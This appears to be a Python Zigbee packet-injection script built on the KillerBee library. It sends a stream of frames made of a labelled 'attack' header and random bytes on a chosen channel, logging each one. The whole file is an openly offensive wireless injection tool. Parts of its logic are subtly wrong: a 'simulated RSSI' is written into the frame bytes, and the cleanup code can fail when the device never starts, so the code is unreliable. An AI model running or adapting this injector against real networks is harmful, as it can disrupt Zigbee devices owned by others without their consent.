import logging
import random
import time
from killerbee import KillerBee

# Žurnāla konfigurācija
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Parametri
INTERFACE = "1:3"  # RZUSBStick saskarne
CHANNEL = 15       # Zigbee kanāls
DURATION = 60     # Darbības ilgums
PAYLOAD_SIZE = 50  # Pakēšu izmērs
DELAY_BETWEEN_PACKETS = 1.0  # Paketes sutīšanas aizturi
HEADER = b"\xAA\xBB"  # Uzbrukuma pakešu galvene
FAILURE_THRESHOLD = 5  # Maksimālais kļūdu skaits līdz apstāšanās brīdim
SIMULATED_RSSI = -90   # Simulētais RSSI (dBm)


# Lietderīgās slodzes ģenerēšana
def create_payload(size):
    return bytes([random.randint(0, 255) for _ in range(size)])


# Paketes ar virsrakstu izveide, lai simulētu vāju RSSI
def create_packet(payload):
   # Izveido paketi ar vāja RSSI simulāciju.
    rssi_header = bytes([SIMULATED_RSSI & 0xFF])  # Kodējam RSSI kā baitu
    return HEADER + rssi_header + payload


# Injekcijas darbība
def send_packets():
    try:
        kb = KillerBee(device=INTERFACE)
        kb.set_channel(CHANNEL)
        logging.info(f"Device {INTERFACE} initialized successfully. Channel: {CHANNEL}")

        start_time = time.time()
        failure_count = 0

        while time.time() - start_time < DURATION:
            payload = create_payload(PAYLOAD_SIZE)
            packet = create_packet(payload)
            try:
                kb.inject(packet, channel=CHANNEL)
                logging.info(f"Sended packet: Header={HEADER.hex()}, RSSI={SIMULATED_RSSI} dBm, Payload={payload.hex()}")
                failure_count = 0
            except Exception as e:
                failure_count += 1
                logging.error(f"Packet error: {e}")

                if failure_count >= FAILURE_THRESHOLD:
                    logging.warning("Send errors exceeded. Pausing injection.")
                    break

            time.sleep(DELAY_BETWEEN_PACKETS)

    except Exception as e:
        logging.error(f"Injector error: {e}")
    finally:
        kb.close()
        logging.info("Injector is over.")


if __name__ == "__main__":
    logging.info("Starting Zigbee injection process...")
    send_packets()
